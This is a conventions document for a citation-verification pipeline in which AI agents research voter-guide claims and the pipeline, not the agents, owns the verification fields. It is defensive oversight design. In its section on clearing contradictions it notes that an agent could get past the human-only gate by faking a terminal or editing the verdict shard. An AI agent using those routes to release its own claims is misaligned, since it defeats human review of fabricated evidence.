# voter-guide-research — conventions

## This repo is public: nothing from a private project lands unreviewed

The tool was built in a private research project, and more will come over from projects like
it: a sample project file, fixtures, examples, a lesson written up during a real run. A branch
here is published the moment it is pushed, and history cannot be scrubbed afterwards, so each
of those goes through the same evaluate-and-clean step the first import did, before it is
committed:
- Review everything being copied for private specifics: names of people and organizations,
  figures and record ids from real research, research findings, copied third-party text,
  personal notes, and references to a private repo or its issues.
- For each one, remove it, reword it as a general lesson that keeps the mechanism, or replace
  it with a synthetic stand-in where the content is load-bearing (a fixture, an example). Use
  one synthetic value per identifier, so code, docs and tests still agree.
- Scan the exact tree for secrets before the first push, not only in CI: the `secret-scan`
  job runs after the push has already published the branch.
- Keep the specifics out of commit messages, PRs and issues here. Describe what was removed in
  general terms.

## The line that must not blur

**Agents own research fields. The pipeline owns verification fields.**
`Verification`, `archive_url`, and `corroboration_ok` are machine-written. An agent that
can set its own `verification.status` can mark its own fabrication verified — exactly the
failure this repo exists to prevent. Keep those fields out of the agent prompts and out of
the schema agents are shown.

Two mechanisms enforce it, and both are load-bearing:
1. `strip_machine_fields()` discards those fields when reading agent-authored claim files.
   A machine field that has to survive a strip-and-write-back lives outside the claim file
   and is re-applied: verdicts in `judgments/`, snapshots in `archives.json`.
2. `revalidate_from_cache()` re-derives every row that counts as evidence from the cached
   page, offline, on every `vg build`. A status the pipeline did not produce cannot
   reproduce, so it downgrades to `human_review` instead of rendering green.

"Reproduce" means passing the **full** offline check `vg verify` runs — source class,
snippet rules, served status, presence and uniqueness — not just finding the words.
`citation_problem()` and `check_page()` in `verify.py` are that check, and both commands call
them; a rule added anywhere else is one build will not enforce. Build's re-check once covered
only presence and uniqueness, so a forged `verified` survived on an excluded aggregator, a
blog, or a soft 404 echoing the quote.

And what renders is what that check gives, not what the file claimed: the status, reason,
excerpt and offsets are all rebuilt, and a query row is rewritten from its re-run. Accepting a
reproducible status while keeping the file's other fields let a fabricated excerpt or a forged
`verified_via_archive` ride through under a genuine match. `could_not_verify_paywall` rows are
included: they never render green, but they count toward corroboration. Rebuilding refines a
row that already matches (a normalized match now exact) and never promotes one into a match: a
`verified` that is only a normalized match now, or a paywall row whose cached page reads fine,
goes to `human_review` for `vg verify` to re-derive.

The support verdict follows the same rule. Build resets every source without a usable
recorded verdict to `unreviewed` before rendering (`judgments.merge()`), so a `support` sitting
in a claim file never renders. See "A gate is a number the tool prints" below.

**Agent-supplied input can refuse, never grant.** Sometimes only the agent knows a fact the
pipeline needs. The verifier's context token is one: nothing on disk says which context a
verifier read, so `vg judge --context` takes it from the agent (see "Tie a verdict to the
context it was handed" below). That is safe only because the value can do nothing but block.
A token matching the current hand-off gets exactly what `vg judge` recorded before tokens
existed, and any other token writes nothing. Nothing an agent passes this way may promote a
status, mark a source judged, or pick the copy a verdict is checked against. And a refusal must
not hand back the value that would have passed: a mismatch that printed the current token
would let a verifier retry blind, with a verdict about text it never read. The same reasoning
covers the trusted reads of a claim file's `context_page` and `query_run` in `vg judge`.

If you add a command that reads `data/claims/`, decide deliberately which side of that line
it sits on. Defaulting to trust is how the invariant erodes.

## The judgment pass is not advisory

Mechanical checks prove a quote is on a page. Only the verifier pass asks whether the page
supports the *claim* — and a pipeline that records that verdict but doesn't act on it has
simply moved the fabrication one layer out, from the quote to the argument. The first
end-to-end run showed exactly that: q6 rendered `verified`, `corroboration_ok: true`,
`15/1 usable`, with all 15 sources judged unsupported by a fresh verifier.

So: a source judged `topic_only`/`contradicts`/`superseded` is not usable evidence. It does
not count toward corroboration, and a claim whose every source was rejected is
`human_review`.

**`contradicts` sends its claim to review, whatever the other sources say.** Leaving it out of
the count was not enough. A source judged `contradicts` beside one judged `supports` left one
document against the one required, so the claim rendered `verified`. Beside a paywalled source
it rendered the yellow flag. Both sit outside the review filter, and only a red badge on one
source said the record argued against the claim. `topic_only` and `superseded` say a page does
not support the claim, and another source can supply what it lacks. `contradicts` says the page
argues against the claim, and a source that agrees does not outvote it. Two pieces of a claim's
own evidence disagree, which `conflicts.py` treats as a finding, not noise to average away.

- **The status.** Any `contradicts` makes the claim `human_review`. It is one check, ahead of
  the verified and paywall branches both, so the two cannot come to disagree about it. It
  outranks `pending` as a failed citation does, since no verdict still to come can clear it.
  It outranks `not_found` too: a contradicted absence claim says the record it could not find
  is there.
- **The conflicts section as well.** The status is what every triage surface reads: the
  counts, the review filter, `vg status`, and `derives_from`, so a conclusion drawn from the
  claim goes to review with it. A line in the conflicts section reaches none of those. It does
  say why the claim is in review, and it does so where the review app says to resolve things
  first. So the choice was both, and each contradicting source is listed there with the
  verifier's note.
- **`topic_only` and `superseded` are unchanged.** They leave the count, and send the claim to
  review only when every source is rejected.
- **A `contradicts` is not retried away.** The skill's retry loop used to count it with the
  other two as "the citation is wrong". A retry that swaps the source for one that agrees
  takes the disagreement off the review page without resolving it. So the skill leaves it for
  the human, and a retry for another failure keeps the source. That is prose an agent can skim,
  so the pipeline also makes dropping the source change nothing (below).

**A dropped contradiction holds its claim until a human clears it.** Keyed by sid, a
`contradicts` whose source a retry dropped matched nothing the claim cites. The conflict line
went, and the claim rendered `verified` on the sources that agree, with no trace that a record
argued against it. Now `judgments.dropped()` reads every `contradicts` in a claim's own shard on
a source it no longer cites. `_settle()` sets them on `Claim.dropped_contradictions` before
`check_inputs()`, which reads the status they set. The claim is `human_review` exactly as for a
cited one, and `detect()` lists each with the conflicts. It names the source by id, with the
verifier's note: a verdict records no URL, so the citation itself is in the claim file's history.
Each of these is load-bearing:
- **The status and the conflict line**, rebuilt from the shard on every build. The field is
  machine-owned: stripped from agent-authored files, and overwritten, never read, when build
  loads a claim file trusted.
- **Nothing else takes it out of the shard.** Re-homing (`vg remap --apply`, bare `vg
  judgments --repair`) archived every verdict its claim no longer cites as lapsed, which would
  have released the claim in silence. The issue proposed teaching re-homing to keep a
  `contradicts` with its claim. #101 retires re-homing instead: question ids are stable and
  claims do not move between them, so no command moves or archives a verdict, and clearing
  (below) is the one way out.
- **Clearing is a command, and it is on the record.** Dropping the source is sometimes right:
  the verifier was wrong, or the claim was re-scoped. `vg clear-contradiction QID SID` moves the
  verdict to `judgments-archive/<stamp>/` with a `CLEARED` note holding the reason. The archive
  is complete or absent (built beside its name, then renamed), and it and every directory above
  it are durable before the shard is rewritten. A failure that leaves the shard holding the
  verdict takes the archive back out, placed or half-built. So a failure leaves the verdict
  live, never lost and never in two places. It refuses a source the claim still cites (that is
  the claim's own evidence disagreeing), any verdict that is not a dropped `contradicts`, and an
  empty reason. It checks the claim again after the person answers, since a retry can cite the
  source again while the prompt waits, and refuses a verdict judged again since it was shown:
  the reason was given for the one the person read. When another claim cites the source, it
  names that claim before asking. Clearing touches that one shard. A verdict names its source
  and a hash of the claim's words, never the claim's id (#30), so which claim it judged rests on
  the shard it sits in, and clearing one that judged another claim costs that claim nothing: it
  is judged by the verdicts in its own shard, or waits for a verifier.
- **Only a person can clear one, and that is a step that fails, not a sentence.** The command
  is named wherever the contradiction is, including `vg judgments`, which agents run, and the
  whole point of the command is to release a claim from review: the thing an agent is steered
  toward. So it asks for the reason at a terminal and refuses when stdin is not one, which is
  how an agent's shell tool runs everything (`cli._at_a_terminal()`). The first version took
  `--reason` and said "not an agent's step" in its docstring; review caught that it was the
  prose rule this section exists to replace. It is a gate against being steered, not a security
  boundary: an agent determined to get past it can fake a terminal, or edit the shard, and no
  local check stops a process with Bash from doing either.

"No longer cites" is by sid, so a retry that keeps the page and changes the quote holds the
claim too: a new quote can be a more agreeable passage of the page that argued against it. The
conflict line says the claim "no longer cites [it] as it did", since which one changed is not
recorded (#90). A verdict filed under a claim before `vg judge` checked that the claim cites
its source is held the same way. Both fail toward review, where a person reads the note and
clears it.

A dropped contradiction is never checked for staleness. `is_stale()` compares a verdict with
the source it judged, which the claim no longer carries, and `vg judge` refuses a source nothing
cites, so a stale one could never be re-judged. It holds until the source is cited again, which
applies and checks it as usual, or until a human clears it. `vg judgments` names these apart
from lapsed verdicts and leaves them out of its gate, which counts only what a verifier can
close.

Rejected: making `vg verify` or `vg check-claim` refuse such a claim. A refusal in `vg verify`
stops the mechanical pass for a whole run over one claim's triage question. It also reaches
none of the surfaces the status does: the review filter, `vg status`, `derives_from`. A refusal
in `vg check-claim` blocks a researcher who has to drop the source for a good reason (the page
is gone, the question was narrowed) with a failure only a human can clear. The status gate
makes the drop pointless, and that is what the prose rule was for. Also rejected: a `cleared`
flag on the verdict itself. Shard entries are exactly `Judgment`, an older checkout refuses
an unknown key, and #30 and #74 are changing that record.

**An answer whose figures none of its snippets carry goes to review too.** `conflicts.py` finds two kinds
of disagreement inside one claim: (1) its sources disagree on a dollar figure or a year, and
(2) the answer states dollar figures or years, the snippets state some, and none of the
answer's is among them. Both were flags only. `Claim.status` never read them, so the claim
rendered `verified` with a red badge, outside the review filter and the counts, and a claim
that `derives_from` it read it as a met input. Gating on text heuristics can send sound claims
to review, so the cost was measured on two real runs first:

- **(1) stays a flag.** (1) and (2) together flagged about one claim in ten, all otherwise
  mechanically green. Read by hand, all but one were sound: claims with several facts, whose sources carry
  different numbers because they describe different things (a total beside a single gift,
  different offices' dates, different rates). Tighten it before it gates, for example by
  comparing only figures within ~15% of each other as the cross-claim near-miss rule does, and
  skipping year disagreement where the claim cites several dated events.
- **(2) gates.** Alone it flagged one claim in 76, the one the read found plausibly real. It
  sits in the `contradicts` check, so it outranks the same things: the verified and paywall
  branches, `pending` (no verdict changes what the snippets say) and `not_found`.
- **Worked out, not read from the list.** `Claim.status` calls `conflicts.unsourced_figures()`,
  and `detect()` lists what that same function returns. The two cannot disagree, and a status
  read before `detect()` still sees it. `_settle()` runs `detect()` before `check_inputs()`
  anyway, so the line explaining a status is settled before any status is read.
- **The cost holds for the detector as measured.** It fires only when *none* of the answer's
  figures is in a snippet. An answer with one sourced figure beside an unsourced one passes,
  and so does evidence with no figure at all. Widening either changes the cost, so measure it
  again first. It reads snippets only, so a figure a query citation reproduces is not
  evidence to it yet (#81), and a researcher's `vg check-claim` does not run it (#82). (3),
  near misses across claims, prompts across questions and stays a flag.
- **A misread figure is a false conflict.** Two parsing errors read one number as two. A unit
  came from the next word's first letter, so "$5,000 more" was five billion dollars. And units
  scaled in binary floats, so "$8.2 million" was 8199999.999999999, not "$8,200,000". As flags
  they were noise; under a gate they send sound claims to review, so both were fixed with it.
  Tightening a match loses what the loose one caught by accident: a whole-word unit dropped
  "$5MM" and "$6 mil", so every form is listed, in one list the pattern is built from. And a
  rule to keep "$500 K-12" from reading as thousands broke ranges ("$1.5M-2M" read as $1.50),
  so the rarer misread stays. The measurement ran with the old parser. Conflict lines also printed whole dollars, and $4.40 against $4.25 read "$4 vs $4".
  Amounts under $10 and fractional amounts now show cents.

`detect()` reads verdicts now, so `_settle()` runs it once they are applied, after
revalidation and corroboration and before `check_inputs()`. `vg build` and `vg status`
used to run it first, on claim files loaded with their machine fields trusted. There `support`
is whatever the file says. A `contradicts` typed into a claim file would have been listed, and
a recorded one missed. Anything that reads a verdict runs after `judgments.merge()` has applied
the recorded ones.

Verdicts live in `data/judgments/`, one shard per question keyed by source id — **never in
the claim file**.
`vg verify` reloads claims with `strip_machine_fields()` on (that is what stops a researcher
self-certifying), so a verdict written inline is destroyed by the next verify run. Keying by
source id also means a judgment lapses on its own when a retry changes the quote, which is
correct: it was a judgment about different words. The answer is the other half of what was
judged, and a verdict about another answer is stale (see "A verdict is about the answer it
judged, too"). A `contradicts` on a source the claim no longer cites is the exception: it holds
its claim instead (above).

**An unreadable verdict must fail, whether it is a whole file or a single entry. It must
never read as "unreviewed".** `load()` used to return `{}` for a file it could not parse or
that was not a list. A hand-repaired, dict-shaped shard from a live run therefore
vanished, and every source in it read as unjudged. That says "nobody judged this" when the
truth is "the verdicts are unreadable". It was also a delete, because the writer loads and
then overwrites: `record()` would have kept only the new verdict. The general rule: **when a
reader feeds a writer, reading garbage as empty is a delete.**

The same bug sat one level down. Inside a list that parsed, `load()` skipped any entry it
could not read: one that was not an object, had a typo'd, extra, or missing key, or carried
a verdict outside `VERDICTS`. It also let a second entry for the same sid overwrite the
first, and `json.loads` kept only the last of two equal keys inside one entry. Each one was
absent from the result and then deleted by the next rewrite. A field of the wrong type (a
numeric note, a string or `NaN` extractor version) loaded fine and crashed a later command,
or with `NaN` never went stale. A `null` note is allowed: it holds nothing to lose, and every
reader already takes it as empty. A sid that is not what `Source.sid` makes (empty, padded,
typo'd) loaded as a verdict that matched nothing, which reads as lapsed: a recorded verdict
silently judging nothing.

So `load()` raises `UnreadableJudgments` naming the file, and so does `load_every()` for a
directory it cannot list. Only a file that is really missing reads as empty. For bad entries
the error also names each entry's index and every problem with it, all in one message, so a
repair is not a loop of re-runs. Every command that reads verdicts stops on the error with
the file named: through `_judgments_or_exit()`, or, for `vg judge`, through its existing
`ValueError` handler around `record()`. Both escape the message, because it quotes the
file's own text and rich reads brackets as markup.

- **Read everything before acting on any of it.** `vg verify` reads every claim's verdict
  file before it fetches anything, so a malformed shard for a later claim stops the run before
  any network time is spent, not after the earlier claims' pages are fetched.
- **Write only what can be read back.** `record()` refuses an entry `load()` would refuse, so
  one bad `vg judge` call cannot stop every reader of the shard.
- **Replace a shard whole.** `_write()` writes and fsyncs a temp file, then `os.replace`s it
  into place. A reader refuses a partial file, and verifier agents write while other commands
  read, so an in-place write would let a background `vg judge` stop a concurrent `vg build`.
- **Repair, don't delete.** Rewrite a malformed file as a JSON list of verdicts, and fix a bad
  entry in place. Deleting either to get past the error discards the verdicts it holds, so
  the message says so to the agents and humans who see it.

**A verdict is per question, not per source.** It says whether a source supports *one
question's claim*, so two questions citing the same page each hold their own verdict for it,
and the two can legitimately differ: a snippet can support one claim and be `topic_only` for
another. The live runs had 13 such sources. A re-home that pooled every shard by sid kept one
verdict per source and filed it under whichever claim cited that source last. That deleted the
other verdict, and could render a `supports` green on the claim a verifier judged `topic_only`.
Nothing may pool verdicts across questions by sid; `load_every()` returns them per question.

**A sid match is not proof of ownership.** When two claims cite one source, "this claim cites
the source" is true of the wrong claim as often as the right one. A verdict names its source
and a hash of the claim's words (`claim_fingerprint`, #30; see "A verdict is about a source as
cached at judgment time"), never the claim's id, so which claim it judged rests on the shard it
sits in: asserted, never proven. That is why nothing moves a claim, or its verdicts, between
shards (see "Question ids are stable and never reused"). Every re-home had to guess ownership
from a sid or trust an operator's mapping, and both put verdicts on claims they never judged.

`record()` holds an `flock` on `judgments/` across its read and write, and readers take it
shared. Verifier agents record in parallel, so a `vg judge` landing between another's read and
its rewrite would otherwise be deleted by the rewrite. The wait is bounded (`LOCK_TIMEOUT`):
every holder needs milliseconds, and a verifier blocked forever behind a stuck process would
report nothing.

## A claim's status is settled last, in dependency order

`Claim.status` reads everything else, so anything that reads *it* runs after all of that has
settled. `check_inputs()` once ran before `revalidate_from_cache()` and
`check_corroboration()`, so it read the `corroboration_ok` the claim file carried from the
last verify and a status build was about to downgrade: q36 (`derives_from` q17) rendered
verified while q17 went to `human_review` later in the same build. It also ran in file order,
one level deep, so a claim could read an input whose own inputs had not been checked yet.
Now `check_inputs()` runs last and walks `derives_from` inputs-first, so a downgrade reaches
every claim built on it. A cycle is reported and its members marked unmet, not looped. The
order lives in one place, `cli._settle()`, which `vg build` and `vg status` both call: a new
command that reads `c.status` should call it too, rather than repeat the sequence. Conflict
detection comes after the verdicts, since a `contradicts` verdict is a conflict, and before
`check_inputs()`, so the conflicts that explain a status are settled before any status is read.

**A mechanical failure outranks `pending`.** `pending` means a verdict could still clear the
claim. No verdict can clear a claim with a failed citation, and the verifier does not judge a
quote that isn't on the page, so a claim whose only source was `snippet_not_found` read
`pending` forever instead of asking for a fix. Any source in `MECHANICAL_FAILURES` now makes
the claim `human_review`, with or without verdicts, whatever its other sources say. That
includes a paywalled one: `could_not_verify_paywall` is a yellow badge outside the review
filter, and a broken citation must not hide behind it. It outranks `not_found` for the same
reason: an absence claim needs no citation, but a broken one it carries is still shown. A
`contradicts` verdict, and an answer whose figures no snippet carries, outrank both the same
way (see "The judgment pass is not advisory").

## Matching is literal first, normalized second — never silently

The promise to the human is that ⌘F will find the snippet, so `verify.py` tries an exact
substring match before anything else. Normalized matching (whitespace, smart quotes,
dashes, ligatures) is a real-world necessity for PDFs and copy-paste drift, but it is
always reported as `normalized_match` / `pdf_normalized_match`, never as `verified`. If you
find yourself widening normalization to make more things pass, stop: the point is to catch
bad citations, not to maximize the green count.

Gotcha found while building: `--` as an ASCII em dash does not fold via NFKC. `normalize()`
collapses hyphen runs to handle it; digit-hyphen-digit ("9-2") is unaffected.

## Uniqueness matters as much as presence

A snippet appearing three times fails. Not pedantry — an ambiguous ⌘F means the human
confirms the wrong instance. It is also why `fetch.py` prefers trafilatura body extraction
over a full DOM dump: repeated nav/footer strings create false duplicates. The full-DOM
fallback only kicks in when extraction yields under ~400 chars.

## Paywalls are flagged, never failed

A paywalled newspaper story we cannot fetch is still a good citation; the human checks it via the
archive snapshot or a subscription. Failing it would push researchers toward worse,
freely-scrapeable sources — the opposite of what we want.

`vg archive` saves a **fresh** snapshot rather than accepting whatever is already in the
Wayback Machine, and then re-checks paywalled snippets against it (`verified_via_archive`).
Both matter for the same reason: on a paywalled row the snapshot is the human's only route
to the text, so a stale capture that predates the quote is worse than no snapshot at all —
it looks like verification.

**Nor is a paywalled row left waiting on a verdict.** A `could_not_verify_paywall` row has no
confirmed context: the live page is gated, and no snapshot confirmed the quote. So the judgment
pass cannot cover it. `vg judge` refuses it (there is no copy to stamp), and a verdict recorded
on it reads stale. The roll-up's "unreviewed means pending" rule still counted it, and that rule
runs before the paywall branch. Every claim resting on a paywalled source therefore read
`pending` forever: waiting on a judgment pass that could never record anything, with no paywall
badge. That is failing it by another name, and it pushes researchers to swap in a readable copy.

So a paywalled row is outside the judgment pass (`models.NOT_JUDGED`, read by
`Source.awaits_verdict`). Its claim rolls up to the yellow paywall flag unless something
outranks it: a failed citation, a `contradicts` verdict, an answer whose figures no snippet
carries, a readable source still waiting on
its verdict, or one `vg verify` has not reached (`pending`, even if a verdict landed on it by
sid). Past those,
the paywall branch applies the all-verified branch's rules, with the flag standing in for green.
Only `corroboration_ok: true` earns the flag, unchecked corroboration is `pending`, and failed
corroboration is `human_review`. The flag is not a pass, and it sits outside the review filter,
so an adversarial claim one document short must not hide behind it. A source the verifier
judged `topic_only` or `superseded` is left out of the count, as it is beside a verified one.

The route to a verdict is the snapshot. Once `vg verify` or `vg archive` confirms the quote in
the run's own snapshot, the row is `verified_via_archive`, its context is that snapshot, and it
waits on a verdict like any other row.

The rejected design was to judge a paywalled row's snapshot wherever one exists, stamped with
the snapshot. Every snapshot that confirms the quote is already judged that way, as
`verified_via_archive`. A row still paywalled has no snapshot, or one that does not confirm the
quote, so the verifier would judge text the quote is not in. And a row with no snapshot still
could never be judged, so its claim would stay `pending`, which is the bug itself. A test pins
`NOT_JUDGED` to exactly `USABLE` minus `GOOD`, so a new usable status with no context has to be
classified rather than read `pending` forever.

## Nothing to search is not "not on the page"

A scanned PDF serves fine and extracts to nothing but the `[[page N]]` markers
`_extract_pdf()` inserts. That text is truthy, so every `not page.text` check let it through
to the search, which found nothing: `snippet_not_found`, "the quote was reconstructed rather
than copied", and from `vg check`, "Do not cite this". A real citation to a real filing,
called fabricated — the verdict that pushes a researcher to substitute a copy they can read.

`fetch.has_text()` is the one test for "is there anything to search". Wherever page text is
read, use it, never `not page.text` — or `fetch.unreadable_reason()` where an error or a
non-2xx page must count as unreadable too, since a bot challenge has text. Two changes each
re-derived it as `page.text.strip()` within a day of it being made shareable, which is how
this gap reopens. `vg check` calls the verifier's own `snippet_problem()` and
`check_snippet()` rather than re-implementing them, so a researcher's self-check judges a
snippet and a page exactly as `vg verify` does (source class aside: that needs the whole
citation).

A PDF that served with no text is `human_review`, with a reason saying what to do (confirm
by eye and keep it with a `page` locator, or cite a text-layer copy with
`secondary_host_ack`). Not `fetch_failed` either: the fetch worked, and that label invites
the same swap.

It is decided in `check_page()` at read time, not recorded as a fetch error. A fetch-time
error reaches only pages fetched after it exists; a read-time check covers every page already
cached, with no extractor bump.

`has_text()` is whole-document, so a typed cover page in front of scanned schedules makes the
PDF searchable, and a quote on a scanned page came back `snippet_not_found`.
`fetch.pages_without_text()` is the same test applied between markers — never a second
definition of "no text". A miss whose `page` names one of them is the scan case, on that page.
A miss with no such `page` stands, since a blank page is common and downgrading every miss on
one would weaken the fabricated-quote check; its reason names the text-less pages instead.
That makes `page` part of the check, so `vg check` takes `--page`. A text-less page may be
blank rather than scanned, and the extraction can't tell, so `page` pointed at a blank page
also reaches `human_review`: still a failure, never green, and its reason tells the human a
blank page means the quote is not there. Telling the two apart is #28.

The snapshot check is the exception to "the miss stands", and the reason is worth keeping: a
rule is only as right as the statuses it chooses between. In `check_page()` the alternative to
`snippet_not_found` is a softer verdict, so letting a miss stand protects the fabricated-quote
check. In `check_snapshot()` the alternatives are `archive_unusable`, which drops the link — on
a paywalled row, the human's only route to the text — and `archive_unconfirmed`, which vouches
for nothing. So a miss on a capture with text-less pages is unconfirmed, naming them. Copying
the first rule into the second path is what made it wrong there.

Still open: `vg check-claim` fails a kept scan however it is cited, so the researcher agent is
told to hand that one failure on (#29).

## Text the pipeline inserted is never evidence

The `[[page N]]` markers are ours. `[[page 7]]` is ten characters, has no line break, and is
unique in any PDF of seven or more pages, so it verified against documents that never contain
it. A snippet containing one is refused in `snippet_problem()`, and `_locate()` drops any
hit touching one, which catches a fragment ("page 7]]") and keeps markers out of uniqueness
counts. Anything else the extractor adds to page text needs the same treatment: the promise is
what a human's Cmd-F finds in the document, not what our extraction contains.

## Report the first failure, not the last

`_extract_pdf()` returned its failure in the title slot, and the row read `fetch_failed: empty
pdf text`. Both cached rows it hit were HTML 404 pages at `.pdf` URLs: the 404 caused the
extraction failure, and recording the extraction failure hid the 404. An extraction failure is
now recorded only on a response that served, naming its cause and content type. An unopenable
200 PDF stays `fetch_failed`, not `human_review` like a scan: a scan opened and has pages, but
an unopenable file is not known to be a document at all, and the common case is an error page.
(An HTML page at a `.pdf` URL is still parsed as a PDF, so a paywall there is failed: #27.)

## Rich reads brackets as markup

`con.print()` and `Table.add_row()` treat `[...]` as a style tag. Page text printed raw showed
`[[page 1]]` as `[]` and dropped `[sic]`, so `vg fetch` hid the page breaks a researcher cites
by, a snippet copied from its output was not on the page, and `vg check-claim` reported a
refused marker as "snippet contains [], a page locator". And a `[/]` with nothing open raises
`MarkupError`: one in a verdict note crashed `vg judge` after the verdict was on disk, and one in
a claim's id turned the "skipped as unreadable" line into a traceback in every command that
loads claims.

So nothing the pipeline does not control is ever printed as markup. That covers claims and
verdict notes, pages and recipe responses, CAL-ACCESS and FPPC rows, race and registry files, the
arguments an agent passes, paths, and exception text, which quotes any of these. Only numbers,
the pipeline's own enums (statuses, verdicts), pattern-checked question ids and the code's own
literals go in bare.
- **Escaping each value is not escaping the message.** `escape()` neutralises only a tag complete
  inside the value it is given. `[/` in one value and `x]` in the next, with plain text between,
  still made the closing tag `[/ x]`: `vg form700 '[/' 'x]'` raised, and so did
  `vg handoff '[/' --data 'x]'` instead of refusing. In a line, escape a run of data as one
  string: `escape(f"{first} {last}")`, not `{escape(first)} {escape(last)}`. Or print the whole
  message as one `Text`, as `cli._refuse()` does for the refusals `vg judge` and `vg handoff`
  print (through `_printable()`, since an argument can also carry a control character or a lone
  surrogate).
- **Refuse a malformed argument before anything prints it.** `vg judge`, `vg handoff` and
  `vg clear-contradiction` check the question id with `judgments.path_for()` first, so the id
  they print afterwards is a pattern-checked one.
- **In a table, a data cell is `Text(value)`.** `escape()` adds a backslash to a value ending in
  one, and only a tag that follows takes it back, so at the end of a cell it printed. Truncated
  names end anywhere. The `vg verify` and `vg judgments` tables still use `escape()` cells, and
  so does an escaped run at the end of a line (#117).
- **A whole value that is data is printed as `Text` with `soft_wrap=True`.** That covers page
  text, a query value, a recipe response and a pasted cURL entry. It is what a researcher
  copies, and an 80-column wrap would put line breaks in a snippet or a YAML line.
- **`escape()` and `.strip()` take only a `str`.** YAML reads an unquoted
  `verified: 2026-08-21` as a date, a blank `summary:` as None, and `limits: 60` as a number, so
  a value from a data file is `str()`'d first.
- **`escape()` leaves emoji shortcodes alone,** so the console is built with `emoji=False`.
  Otherwise `:ok:` in a note or a filer name printed as an emoji.

Every print site in `cli.py` follows this, and a new one has to. That settles markup only. A
lone surrogate still makes a print raise, and ESC or C1 sequences in a `Text` still reach the
terminal. `_printable()` handles both, but only `vg handoff`, `vg judge` and the shared helpers
they call (the `load_claims()` skip lines, the cache-root refusals) use it so far (#142).

Test with both kinds of text. Whether a stray tag raises or silently vanishes depends on the tags
around it. In `[yellow]{x}[/]`, an `x` of `[/] [sic]` closes yellow, opens `[sic]`, and the
line's own `[/]` closes that: nothing raises, and nothing prints. So assert that the text comes
out as written, not only that nothing raised (`tests/test_cli_markup.py`).

A test that widens the console must not pin it. `cli.con.width = n` sets rich's `_width`, and
putting back the value read beforehand sets it again, to the width rich computed (80 under
pytest). From then on `COLUMNS` never reaches `cli.con` in that process, so a later test passing
`env={"COLUMNS": ...}` to `CliRunner` wraps its table or not depending on test order. Widen with
`monkeypatch.setattr(cli.con, "_width", n)`, which puts back `None`. Older tests still restore
by assignment (#132).

## A verdict is about a source as cached at judgment time

Three staleness bugs in one night, all the same shape and caught by three different amounts of
noise: a stale `expected` value was caught **loudly** by `vg check-claim`; a stale cached page
is now caught **automatically** by `EXTRACTOR_VERSION`; a stale *judgment* was caught by
**nothing**. Six verdicts said "roster-only, no bill number" about pages that, after a
re-fetch, contain the bill number.

Verdicts now carry the fetch time and extractor version of the page they judged, and one that
predates its page is reported and NOT applied — the source reverts to unreviewed, which the
pipeline already treats as not-verified, so it fails toward re-checking rather than toward
shipping.

Direction matters less than silence. That instance made the pipeline harsher than the evidence
warranted, costing good citations. The reverse — a `supports` surviving a re-fetch that removed
the supporting text — ships a green row nobody checked, by the same mechanism.

**A verdict also names the claim it judged (#30).** A sid covers the quote, not what the claim
says about it, so a retry that rewrites the answer and keeps the quote kept the verdict too.
`vg judge` now stamps `claim_fingerprint` on every verdict: `Claim.fingerprint`, a short hash of
the claim's question and answer. A verdict whose stamp no longer matches its claim judged words
the claim no longer says, and is stale (#74, "A verdict is about the answer it judged, too").
Why that identity:
- **The answer and the question.** A verdict judges one answer to one question, and answers
  repeat: "Yes." to two questions is two claims.
- **Exact text, not normalized.** Which edits keep a claim's meaning is a judgment ("$40k" to
  "$4k" is one character), and a spurious change costs a re-judgment, never a false green.
- **Not the sources.** A verdict judges one of them, and adding another must not lapse it.

Rejected: an id minted when the claim is first written. Claim files are agent-authored and
rewritten by `vg verify`, and an id that survives a retry says nothing about whether the answer
changed, which is the whole question. The fingerprint is recomputed from what the claim says, by
the pipeline, and `vg judge` takes no flag for it.

Where it stops. Verdicts from before stamping carry none, and nothing backfills one (they read
stale: see #74's section). Older
checkouts refuse a shard holding a stamped verdict (an unknown key), the safe side. And the
stamp is the claim as `vg judge` reads it, not the text the verifier was handed: a rewrite
between hand-off and recording is the hand-off token's to catch (#36), and one after recording
is this stamp's.

**The stamp and the check must read the same cache.** They didn't. `vg judge` stamped from the
shared cache (`_cache_root()`, so `data/cache`), while `apply_to()` looked the page up under
the data dir it was handed. For a candidate run that is `data/<candidate>/cache`, where the page
normally isn't, and a missing page reads as "not stale": the check compared nothing and passed
the verdict. Both sides now go through one lookup (`judgments.judged_copy()` / `is_stale()`).
`cache_root` is a required keyword on `verdicts_for()` and `apply_to()`, because defaulting it
to the data dir *is* the bug. Every caller passes `_cache_root(data, cache)`, and every command
that resolves a cache root takes `--cache` (`vg query` and the `vg calaccess` subcommands
included). If you override `--cache` for build, override it for judge too.

The miss did not stay a miss. `load_cached()` went through `cache_dir()`, which mkdirs, so the
first check of a recorded verdict created `data/<candidate>/cache/pages`, and `_cache_root()`
then preferred that directory to the shared one. From there every command for the candidate ran
on a forked, near-empty cache: stamp and check agreed again, but about the wrong copy, and
`vg build` downgraded sources for want of a cached page. A read now creates nothing. A lookup
that creates the thing it looks for can change where the next lookup goes.

**No page to compare against means stale, not fresh.** Even with one root, `is_stale()` returned
"" whenever the lookup came back empty (a deleted page, an unparseable cache file, a mistyped
`--cache`), and `vg judge` wrote an empty stamp for an uncached page, which truthiness guards
then exempted from every check forever. Every path that cannot make the comparison now answers
stale; fresh has to be shown. The same rule, three places:
- `vg judge` refuses an uncached page (run `vg verify` first) and writes nothing. It also
  refuses unless the named claim, by exact case-sensitive id, cites the sid: `q07` for `q7`, a
  sid another claim cites, or `Q1` on a case-insensitive disk (which `vg build` reads as
  `q1.json` and `vg judgments` misses) each wrote a verdict nothing read, and said "recorded".
  `vg judgments` names any shard filed under an id no claim has, and opens a shard by name as
  `vg build` does, so the two agree about `Q1.json` on either kind of disk. Where the disk
  opens `Q1.json` as `q1.json`, it *is* q1's shard, which the disk decides and a source id does
  not (`judgments.opened_as()`). On a case-sensitive disk it is simply a shard no claim has:
  nothing reads it. Either way the fix is to rename it to the claim's exact id by hand.
- `--cache` names the directory that *holds* `cache/`: `--cache data`, not `--cache
  data/cache`. Every command refuses a `--cache` that is itself a cache directory (it holds
  `pages/` or `calaccess/`), since `fetch` and `verify` used to create a second cache inside
  it. `judge`, `judgments`, `build` and `status` never create a cache, so they also refuse an
  explicit root holding no `cache/` at all, and warn when the inferred one has none.
- Stamps compare as parsed times, never text, and a cache holding an *older* copy than the
  one judged (a merged stray, a restored backup) is stale too.

Two deliberate exceptions. A **legacy** verdict, recorded before stamping (every one in the
committed run), is checked against its `judged_at`: a page fetched no later is the copy that
was cached when it was judged. Blanket-stale would re-judge whole runs to learn nothing;
blanket-fresh was the fail-open. (Such a verdict also predates `claim_fingerprint`, so since
